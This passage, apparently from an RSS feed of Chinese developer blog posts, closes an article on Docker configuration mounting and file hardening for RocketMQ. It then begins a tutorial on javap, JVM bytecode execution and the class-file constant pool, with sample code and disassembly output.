    <span class="hljs-attr">broker_role:</span> <span class="hljs-string">SYNC_MASTER</span>  
    <span class="hljs-attr">auto_create_topic:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">memory:</span> <span class="hljs-string">1g</span>
  <span class="hljs-attr">prod:</span>
    <span class="hljs-attr">broker_role:</span> <span class="hljs-string">SYNC_MASTER</span>
    <span class="hljs-attr">auto_create_topic:</span> <span class="hljs-literal">false</span>
    <span class="hljs-attr">memory:</span> <span class="hljs-string">2g</span>
</code></pre>
<p><strong>配置生成脚本：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># generate-config.sh - 多环境配置生成</span>

ENV=<span class="hljs-variable">${1:-dev}</span>
CONFIG_MATRIX=<span class="hljs-string">"config-matrix.yml"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"生成 <span class="hljs-variable">$ENV</span> 环境配置..."</span>

<span class="hljs-comment"># 从矩阵中提取配置</span>
BROKER_ROLE=$(yq <span class="hljs-built_in">eval</span> <span class="hljs-string">".environments.<span class="hljs-variable">$ENV</span>.broker_role"</span> <span class="hljs-variable">$CONFIG_MATRIX</span>)
AUTO_TOPIC=$(yq <span class="hljs-built_in">eval</span> <span class="hljs-string">".environments.<span class="hljs-variable">$ENV</span>.auto_create_topic"</span> <span class="hljs-variable">$CONFIG_MATRIX</span>)

<span class="hljs-comment"># 生成配置文件</span>
<span class="hljs-built_in">cat</span> &gt; config/<span class="hljs-variable">$ENV</span>/broker.conf &lt;&lt; <span class="hljs-string">EOF
# 自动生成配置 - $ENV 环境
brokerRole = $BROKER_ROLE
autoCreateTopicEnable = $AUTO_TOPIC
flushDiskType = ASYNC_FLUSH
namesrvAddr = rmqnamesrv:9876
EOF</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ <span class="hljs-variable">$ENV</span> 环境配置生成完成"</span>
</code></pre>
<h2 data-id="heading-30">七、生产环境最佳实践</h2>
<h3 data-id="heading-31">7.1 挂载方式选择指南</h3>









































<table><thead><tr><th>数据类型</th><th>推荐挂载方式</th><th>理由</th><th>示例</th></tr></thead><tbody><tr><td><strong>应用配置</strong>​</td><td>绑定挂载</td><td>四大优势完美契合配置管理</td><td><code>./config:/app/config</code></td></tr><tr><td><strong>数据库数据</strong>​</td><td>命名卷</td><td>Docker 管理、备份方便</td><td><code>db_data:/var/lib/mysql</code></td></tr><tr><td><strong>日志文件</strong>​</td><td>目录挂载</td><td>实时查看、日志收集</td><td><code>./logs:/app/logs</code></td></tr><tr><td><strong>临时缓存</strong>​</td><td>匿名卷</td><td>自动清理、性能好</td><td>不配置 volumes</td></tr><tr><td><strong>敏感数据</strong>​</td><td>命名卷 + 加密</td><td>安全隔离</td><td><code>encrypted_volume:/secrets</code></td></tr></tbody></table>
<h3 data-id="heading-32">7.2 配置文件绑定的安全加固</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 配置文件权限控制</span>
<span class="hljs-built_in">chmod</span> 600 broker.conf                    <span class="hljs-comment"># 只允许所有者读写</span>
<span class="hljs-built_in">chown</span> root:root broker.conf             <span class="hljs-comment">#  root 用户所有权</span>
setfacl -m u:spring:r broker.conf       <span class="hljs-comment"># 容器用户只读权限</span>

<span class="hljs-comment"># 2. 配置加密存储</span>
ansible-vault encrypt broker.conf       <span class="hljs-comment"># Ansible Vault 加密</span>
gpg --encrypt --recipient devops@company.com broker.conf  <span class="hljs-comment"># GPG 加密</span>

<span class="hljs-comment"># 3. 配置完整性验证</span>
<span class="hljs-built_in">sha256sum</span> broker.conf &gt; broker.conf.sha256
<span class="hljs-comment"># 部署前验证</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-subst">$(cat broker.conf.sha256)</span> broker.conf"</span> | <span class="hljs-built_in">sha256sum</span> -c
</code></pre>
<p><strong>好的配置管理是成功部署的基石</strong>，合理运用这些挂载策略，将极大提升您的 DevOps 效率和系统可靠性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JDK 工具学习系列（五）：深入理解 javap、字节码与常量池]]></title>    <link>https://juejin.cn/post/7575718948298096691</link>    <guid>https://juejin.cn/post/7575718948298096691</guid>    <pubDate>2025-11-24T03:04:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575718948298096691" data-draft-id="7575412016405823498" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JDK 工具学习系列（五）：深入理解 javap、字节码与常量池"/> <meta itemprop="keywords" content="Java,JVM"/> <meta itemprop="datePublished" content="2025-11-24T03:04:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="日月星辰Ace"/> <meta itemprop="url" content="https://juejin.cn/user/2225067264583453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JDK 工具学习系列（五）：深入理解 javap、字节码与常量池
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067264583453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    日月星辰Ace
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:04:10.000Z" title="Mon Nov 24 2025 03:04:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JDK 工具学习系列（五）：深入理解 javap、JVM 字节码与常量池</h2>
<h3 data-id="heading-1">目录</h3>
<ol>
<li><a href="#%E5%89%8D%E8%A8%80" title="#%E5%89%8D%E8%A8%80">前言</a></li>
<li><a href="#java-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9E%B6%E6%9E%84%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9E%8B" title="#java-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9E%B6%E6%9E%84%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9E%8B">Java 虚拟机架构与执行模型</a>
<ul>
<li><a href="#jvm-%E7%9A%84%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84" title="#jvm-%E7%9A%84%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84">JVM 的整体架构</a></li>
<li><a href="#%E5%9F%BA%E4%BA%8E%E6%A0%88%E7%9A%84%E6%89%A7%E8%A1%8C%E5%BC%95%E6%93%8E" title="#%E5%9F%BA%E4%BA%8E%E6%A0%88%E7%9A%84%E6%89%A7%E8%A1%8C%E5%BC%95%E6%93%8E">基于栈的执行引擎</a></li>
<li><a href="#jvm-%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84" title="#jvm-%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84">JVM 的内存结构</a></li>
</ul>
</li>
<li><a href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%AF%94%E7%89%B9%E5%AD%97%E8%8A%82%E4%B8%8E%E5%AD%97%E8%8A%82%E7%A0%81" title="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%AF%94%E7%89%B9%E5%AD%97%E8%8A%82%E4%B8%8E%E5%AD%97%E8%8A%82%E7%A0%81">基础概念：比特、字节与字节码</a>
<ul>
<li><a href="#%E6%AF%94%E7%89%B9bit%E4%B8%8E%E5%AD%97%E8%8A%82byte" title="#%E6%AF%94%E7%89%B9bit%E4%B8%8E%E5%AD%97%E8%8A%82byte">比特（bit）与字节（byte）</a></li>
<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81bytecode" title="#%E5%AD%97%E8%8A%82%E7%A0%81bytecode">字节码（Bytecode）</a></li>
<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84" title="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">字节码文件结构</a></li>
</ul>
</li>
<li><a href="#jvm-%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B" title="#jvm-%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B">JVM 字节码的执行流程</a>
<ul>
<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F" title="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F">字节码指令的格式</a></li>
<li><a href="#%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8" title="#%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8">操作数栈与局部变量表</a></li>
<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90" title="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90">字节码执行的实际例子</a></li>
</ul>
</li>
<li><a href="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3" title="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3">常量池机制详解</a>
<ul>
<li><a href="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%B1%BB%E5%9E%8B" title="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%B1%BB%E5%9E%8B">常量池的作用与类型</a></li>
<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81%E4%B8%8E%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E5%85%B3%E7%B3%BB" title="#%E5%AD%97%E8%8A%82%E7%A0%81%E4%B8%8E%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E5%85%B3%E7%B3%BB">字节码与常量池的关系</a></li>
<li><a href="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E5%AE%9E%E9%99%85%E5%86%85%E5%AE%B9%E4%B8%8E%E5%BC%95%E7%94%A8" title="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E5%AE%9E%E9%99%85%E5%86%85%E5%AE%B9%E4%B8%8E%E5%BC%95%E7%94%A8">常量池的实际内容与引用</a></li>
</ul>
</li>
<li><a href="#%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%91%BD%E4%BB%A4javap-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90" title="#%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%91%BD%E4%BB%A4javap-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90">实用工具与命令：javap 深度解析</a>
<ul>
<li><a href="#javap-%E7%9A%84%E5%AE%98%E6%96%B9%E8%AF%B4%E6%98%8E" title="#javap-%E7%9A%84%E5%AE%98%E6%96%B9%E8%AF%B4%E6%98%8E">javap 的官方说明</a></li>
<li><a href="#%E5%B8%B8%E7%94%A8-javap-%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%8F%82%E6%95%B0" title="#%E5%B8%B8%E7%94%A8-javap-%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%8F%82%E6%95%B0">常用 javap 命令与参数</a></li>
<li><a href="#javap-%E8%BE%93%E5%87%BA%E8%AF%A6%E8%A7%A3%E4%B8%8E%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90" title="#javap-%E8%BE%93%E5%87%BA%E8%AF%A6%E8%A7%A3%E4%B8%8E%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90">javap 输出详解与案例分析</a></li>
</ul>
</li>
<li><a href="#%E5%B8%B8%E8%A7%81%E7%96%91%E9%97%AE%E4%B8%8E%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90" title="#%E5%B8%B8%E8%A7%81%E7%96%91%E9%97%AE%E4%B8%8E%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90">常见疑问与深入解析</a></li>
<li><a href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E5%85%A8%E6%B5%81%E7%A8%8B%E8%BF%BD%E8%B8%AA" title="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E5%85%A8%E6%B5%81%E7%A8%8B%E8%BF%BD%E8%B8%AA">实战案例：从源码到字节码的全流程追踪</a></li>
<li><a href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AD%A6%E4%B9%A0%E5%BB%BA%E8%AE%AE" title="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AD%A6%E4%B9%A0%E5%BB%BA%E8%AE%AE">总结与学习建议</a></li>
<li><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" title="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li>
</ol>
<hr/>
<h3 data-id="heading-2">前言</h3>
<p>在深入学习 Java 虚拟机（JVM）和 JDK 工具的过程中，理解字节、字节码、常量池以及 JVM 的栈式架构，是掌握 Java 性能调优、底层原理和排查复杂问题的基础。本文结合实际学习过程、工具输出和常见疑问，系统梳理相关知识点，帮助你建立从源码到字节码再到 JVM 执行的完整认知链路。</p>
<hr/>
<h3 data-id="heading-3">Java 虚拟机架构与执行模型</h3>
<h4 data-id="heading-4">JVM 的整体架构</h4>
<p>JVM 主要包括以下几个核心组件：</p>
<ul>
<li><strong>类加载子系统</strong>：负责加载、验证、准备、解析和初始化类。</li>
<li><strong>运行时数据区</strong>：包括方法区、堆、虚拟机栈、本地方法栈、程序计数器等。</li>
<li><strong>执行引擎</strong>：负责字节码的解释执行或即时编译（JIT）。</li>
<li><strong>本地方法接口</strong>：与本地（C/C++）库交互。</li>
</ul>
<h4 data-id="heading-5">基于栈的执行引擎</h4>
<p>JVM 的指令集是**基于栈（Stack-based）**的，而不是基于寄存器。其特点：</p>
<ul>
<li>所有操作都围绕操作数栈（Operand Stack）进行。</li>
<li>指令通常是“弹出操作数、执行操作、结果入栈”。</li>
<li>这样设计的好处是跨平台性强，指令集简单，便于解释执行。</li>
</ul>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;
</code></pre>
<p>对应字节码：</p>
<pre><code class="hljs language-arduino" lang="arduino">iload_1   <span class="hljs-comment">// 将 a 压入栈</span>
iload_2   <span class="hljs-comment">// 将 b 压入栈</span>
iadd      <span class="hljs-comment">// 弹出 a、b，相加后结果入栈</span>
istore_3  <span class="hljs-comment">// 弹出结果，存入 c</span>
</code></pre>
<h4 data-id="heading-6">JVM 的内存结构</h4>
<ul>
<li><strong>操作数栈</strong>：每个方法执行时都有独立的操作数栈，临时存放计算过程中的数据。</li>
<li><strong>局部变量表</strong>：存放方法参数和局部变量。</li>
<li><strong>堆</strong>：存放对象实例。</li>
<li><strong>方法区</strong>：存放类元数据、常量池、静态变量等。</li>
</ul>
<hr/>
<h3 data-id="heading-7">基础概念：比特、字节与字节码</h3>
<h4 data-id="heading-8">比特（bit）与字节（byte）</h4>
<ul>
<li><strong>比特（bit）</strong>：最小的数据单位，0 或 1。</li>
<li><strong>字节（byte）</strong>：8 个比特组成，计算机最小的寻址单位。</li>
</ul>
<p><strong>为什么用字节而不是比特？</strong></p>
<ul>
<li>现代计算机硬件和操作系统以字节为最小寻址单位，便于存储和读取。</li>
</ul>
<h4 data-id="heading-9">字节码（Bytecode）</h4>
<ul>
<li>Java 源码编译后生成的 <code>.class</code> 文件即为字节码文件。</li>
<li>字节码是一种中间代码，JVM 解释或 JIT 编译后执行。</li>
</ul>
<h4 data-id="heading-10">字节码文件结构</h4>
<p><code>.class</code> 文件结构包括：</p>
<ul>
<li>魔数（Magic Number）</li>
<li>版本号</li>
<li><strong>常量池（Constant Pool）</strong></li>
<li>访问标志</li>
<li>类/父类信息</li>
<li>字段表</li>
<li>方法表</li>
<li>属性表</li>
</ul>
<hr/>
<h3 data-id="heading-11">JVM 字节码的执行流程</h3>
<h4 data-id="heading-12">字节码指令的格式</h4>
<ul>
<li>每条指令由 1 字节操作码（opcode）+ 若干操作数（operand）组成。</li>
<li>指令长度不一，导致字节码偏移量（offset）不连续。</li>
</ul>
<h4 data-id="heading-13">操作数栈与局部变量表</h4>
<ul>
<li><strong>操作数栈</strong>：方法执行时用于临时存放数据和操作结果。</li>
<li><strong>局部变量表</strong>：存放方法参数和局部变量，按索引访问。</li>
</ul>
<h4 data-id="heading-14">字节码执行的实际例子</h4>
<p><strong>Java 代码：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
    <span class="hljs-keyword">return</span> a + b;
}
</code></pre>
<p><strong>javap -c -v 输出：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">0: iload_1</span>
<span class="hljs-section">1: iload_2</span>
<span class="hljs-section">2: iadd</span>
<span class="hljs-section">3: ireturn</span>
</code></pre>
<ul>
<li><code>iload_1</code>：将第 1 个本地变量（a）加载到操作数栈</li>
<li><code>iload_2</code>：将第 2 个本地变量（b）加载到操作数栈</li>
<li><code>iadd</code>：弹出栈顶两个 int 相加，结果入栈</li>
<li><code>ireturn</code>：返回 int 类型结果</li>
</ul>
<hr/>
<h3 data-id="heading-15">常量池机制详解</h3>
<h4 data-id="heading-16">常量池的作用与类型</h4>
<ul>
<li>常量池是 <code>.class</code> 文件中的一张“表”，存储类、方法、字段的符号引用、字符串字面量、数值常量等。</li>
<li>常量池项类型包括：
<ul>
<li><code>CONSTANT_Class</code>：类或接口引用</li>
<li><code>CONSTANT_Fieldref</code>：字段引用</li>
<li><code>CONSTANT_Methodref</code>：方法引用</li>
<li><code>CONSTANT_String</code>：字符串字面量</li>
<li><code>CONSTANT_Integer</code>、<code>CONSTANT_Float</code>、<code>CONSTANT_Long</code>、<code>CONSTANT_Double</code>：数值常量</li>
<li><code>CONSTANT_NameAndType</code>：名称和描述符</li>
</ul>
</li>
</ul>
<h4 data-id="heading-17">字节码与常量池的关系</h4>
<ul>
<li>字节码指令如 <code>ldc #2</code>、<code>invokevirtual #5</code> 等，后面的数字是常量池的索引。</li>
<li>JVM 通过常量池索引找到实际的类名、方法名、字符串等信息，实现符号引用到直接引用的转换。</li>
</ul>
<h4 data-id="heading-18">常量池的实际内容与引用</h4>
<p><strong>javap -v 输出示例：</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">Constant</span> <span class="hljs-selector-tag">pool</span>:
   <span class="hljs-selector-id">#1</span> = <span class="hljs-selector-tag">Methodref</span>          <span class="hljs-selector-id">#2</span>.<span class="hljs-selector-id">#3</span>         <span class="hljs-comment">// java/lang/Object."&lt;init&gt;":()V</span>
   <span class="hljs-selector-id">#2</span> = <span class="hljs-selector-tag">Class</span>              <span class="hljs-selector-id">#4</span>            <span class="hljs-comment">// java/lang/Object</span>
   <span class="hljs-selector-id">#3</span> = <span class="hljs-selector-tag">NameAndType</span>        <span class="hljs-selector-id">#5</span>:<span class="hljs-selector-id">#6</span>         <span class="hljs-comment">// "&lt;init&gt;":()V</span>
   <span class="hljs-selector-id">#4</span> = <span class="hljs-selector-tag">Utf8</span>               <span class="hljs-selector-tag">java</span>/<span class="hljs-selector-tag">lang</span>/<span class="hljs-selector-tag">Object</span>
   <span class="hljs-selector-id">#5</span> = <span class="hljs-selector-tag">Utf8</span>               &lt;<span class="hljs-selector-tag">init</span>&gt;
   <span class="hljs-selector-id">#6</span> = <span class="hljs-selector-tag">Utf8</span>               ()<span class="hljs-selector-tag">V</span>
</code></pre>
<ul>
<li><code>#1</code> 是方法引用，指向 <code>#2</code>（类）和 <code>#3</code>（名称和类型）。</li>
<li><code>#4</code>、<code>#5</code>、<code>#6</code> 是 UTF-8 字符串。</li>
</ul>
<hr/>
<h3 data-id="heading-19">实用工具与命令：javap 深度解析</h3>
<h4 data-id="heading-20">javap 的官方说明</h4>
<blockquote>
<p>javap - disassemble one or more class files</p>
</blockquote>
<p><code>javap</code> 是 JDK 自带的字节码反编译工具，可用于分析 <code>.class</code> 文件结构、字节码指令和常量池内容。</p>
<h4 data-id="heading-21">常用 javap 命令与参数</h4>
<ul>
<li><code>javap -c 类名</code>：反编译字节码</li>
<li><code>javap -v 类名</code>：显示详细信息，包括常量池</li>
<li><code>javap -c -v 类名</code>：同时显示字节码和常量池</li>
<li><code>javap -l 类名</code>：显示行号和本地变量表</li>
<li><code>javap -s 类名</code>：显示方法签名</li>
</ul>
<h4 data-id="heading-22">javap 输出详解与案例分析</h4>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello, JVM!"</span>;
        System.out.println(s);
    }
}
</code></pre>
<p><strong>javap -c -v Demo 输出片段：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">public</span> <span class="hljs-string">static</span> <span class="hljs-string">void</span> <span class="hljs-string">main(java.lang.String[]);</span>
  <span class="hljs-attr">Code:</span>
     <span class="hljs-attr">0:</span> <span class="hljs-string">ldc</span>           <span class="hljs-comment">#2                  // String Hello, JVM!</span>
     <span class="hljs-attr">2:</span> <span class="hljs-string">astore_1</span>
     <span class="hljs-attr">3:</span> <span class="hljs-string">getstatic</span>     <span class="hljs-comment">#3                  // Field java/lang/System.out:Ljava/io/PrintStream;</span>
     <span class="hljs-attr">6:</span> <span class="hljs-string">aload_1</span>
     <span class="hljs-attr">7:</span> <span class="hljs-string">invokevirtual</span> <span class="hljs-comment">#4                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span>
    <span class="hljs-attr">10:</span> <span class="hljs-string">return</span>
</code></pre>
<ul>
<li><code>ldc #2</code>：将常量池第 2 项（字符串）加载到栈</li>
<li><code>getstatic #3</code>：获取常量池第 3 项（System.out）</li>
<li><code>invokevirtual #4</code>：调用常量池第 4 项的方法（println）</li>
</ul>
<hr/>
<h3 data-id="heading-23">常见疑问与深入解析</h3>
<h4 data-id="heading-24">1. 为什么 JVM 采用基于栈的架构？</h4>
<ul>
<li>跨平台性强，指令集简单，便于解释执行。</li>
<li>不依赖底层硬件寄存器，适合多种 CPU 架构。</li>
</ul>
<h4 data-id="heading-25">2. 字节码偏移量为什么不是连续的？</h4>
<ul>
